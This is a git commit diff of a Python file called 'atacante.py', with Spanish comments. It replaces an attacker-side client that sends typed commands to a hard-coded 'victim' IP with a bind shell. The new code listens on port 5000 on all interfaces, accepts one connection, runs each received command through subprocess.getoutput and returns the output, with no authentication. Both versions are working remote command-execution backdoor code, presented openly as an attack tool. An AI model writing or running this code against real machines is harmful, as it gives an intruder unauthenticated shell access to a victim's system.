425a45fdfbcf4236ae26aead2daf805561443fae
Jackson Martínez <35273100+macksonjartinez@users.noreply.github.com>
2024-07-09 23:03:05 -0400

    Update atacante.py

--- atacante.py
+++ atacante.py
@@ -1,33 +1,47 @@
 from socket import socket
+from subprocess import getoutput
+from os import chdir, getcwd
+from time import sleep
 
+# Definimos la dirección y puerto, la direcion 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
+server_address = ('0.0.0.0', 5000)
 
-# Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
-server_address = ('192.168.6.38', 5000)
+# Creamos el socket (la conexión)
+server_socket = socket()
 
-# Creamos el socket cliente, ya que restablecemos la conexión a cada comando que se ejecute
-client_socket = socket()
-client_socket.connect(server_address)
+# Le pasamos la tupla donde especificamos donde escuchar
+server_socket.bind(server_address)
+
+# Cantidad de clientes maximos que se pueden conectar:
+server_socket.listen(1)
+
+# Esperamos a recibir una conexión y acceptarla:
+client_socket, client_address = server_socket.accept()
+
 estado = True
 
 while estado:
+    # Recibimos el comando de la máquina atacante
+    comando = client_socket.recv(4096).decode()
 
-    # Solicitamos al usuario que introduzca un comando
-    comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")
-    
-
-    # Si el usuario introduce "exit", cerramos la conexión y salimos del bucle
-    if comando_enviar == 'exit':
-        # Le decimos al servidor que la conexion la cerramos:
-        client_socket.send(comando_enviar.encode())
-        # Cerramos el socket, que se volverá a abrir al inicio del bucle:
+    # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
+    if comando == 'exit':
+        # Cerramos la conexión con el cliente
         client_socket.close()
+        # Cerramos el socket servidor
+        server_socket.close()
         estado = False
-    else:
-        # Enviamos el comando a la máquina víctima:
-        client_socket.send(comando_enviar.encode())
+    
+    elif comando.split(" ")[0] == 'cd':
+        # Cambiamos de directorio de trabajo
+        chdir(" ".join(comando.split(" ")[1:]))
+        client_socket.send("ruta actual: {}".format(getcwd()).encode())
+    
+    else :
+        # Ejecutamos el comando y obtenemos su salida:
+        salida = getoutput(comando)
 
-        # Esperamos a recibir la respuesta de la víctima y lo guardamos en la variable respuesta.
-        respuesta = client_socket.recv(4096)
-
-        # Imprimimos la respuesta;
-        print(respuesta.decode()) 
+        # Enviamos la salida a la máquina atacante
+        client_socket.send(salida.encode())
+    
+    sleep(0.1)
